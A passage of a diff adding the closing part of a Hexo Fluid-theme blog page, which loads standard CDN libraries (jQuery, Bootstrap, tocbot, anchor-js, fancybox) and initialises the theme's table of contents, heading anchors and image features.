+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
